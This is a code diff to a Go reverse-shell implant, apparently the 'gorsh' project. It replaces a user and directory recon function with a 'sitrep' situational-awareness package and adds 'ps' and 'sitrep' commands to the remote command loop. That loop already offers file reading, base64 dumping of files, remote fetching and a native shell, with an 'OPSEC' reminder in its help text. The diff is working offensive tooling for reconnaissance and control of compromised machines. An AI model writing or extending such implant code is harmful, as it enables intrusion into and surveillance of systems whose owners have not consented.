@@ -18,6 +18,7 @@ import (
 	"code.cloudfoundry.org/bytefmt"
 	"github.com/audibleblink/gorsh/fetch"
 	"github.com/audibleblink/gorsh/shell"
+	"github.com/audibleblink/gorsh/sitrep"
 )
 
 const (
@@ -43,19 +44,6 @@ func Send(conn net.Conn, msg string) {
 	conn.Write([]byte("\n"))
 	conn.Write([]byte(msg))
 	conn.Write([]byte("\n"))
-}
-
-func Intel(conn net.Conn) {
-	user, _ := user.Current()
-	userBlock := fmt.Sprintf("%8s | %8s\n%8s | %8s\n",
-		"User", user.Username, "ID", user.Uid)
-	Send(conn, userBlock)
-
-	dir, _ := os.Getwd()
-	dirBlock := fmt.Sprintf("%8s | %8s\n%8s | %8s\n",
-		"CurrDir", dir, "Home", user.HomeDir)
-
-	Send(conn, dirBlock)
 }
 
 func ListDir(argv []string) (string, error) {
@@ -94,7 +82,7 @@ func InteractiveShell(conn net.Conn) {
 	)
 
 	// Print basic recon data on first connect
-	Intel(conn)
+	Send(conn, sitrep.All())
 	conn.Write([]byte(prompt))
 
 	for scanner.Scan() {
@@ -118,6 +106,10 @@ func InteractiveShell(conn net.Conn) {
 				} else {
 					Send(conn, listing)
 				}
+
+			case "ps":
+				listing := sitrep.Processes()
+				Send(conn, listing)
 
 			case "cd":
 				if len(argv) > 1 {
@@ -165,15 +157,21 @@ func InteractiveShell(conn net.Conn) {
 					Send(conn, "This action requires 2 arguments")
 				}
 
+			case "sitrep":
+				net := sitrep.All()
+				Send(conn, net)
+
 			case "help":
 				Send(conn, "Currently implemented commands: \n"+
 					"cd [path]          -  Change the process' working directory\n"+
 					"ls [path]          -  List the current working directory\n"+
 					"pwd                -  Print the current working directory\n"+
+					"ps                 -  Print process information\n"+
 					"cat <file>         -  Print the contents of the given file\n"+
 					"base64 <file>      -  Base64 encode the given file and print\n"+
 					"fetch <URI> <file> -  Fetch stuff. http[s]:// or //share/folder (Windows only)\n"+
 					"shell              -  Drops into a native shell. Mind your OPSEC\n"+
+					"sitrep             -  Situation Awareness information\n"+
 					"\n")
 			default:
 				Send(conn, "Command not implemented. Try 'help'")
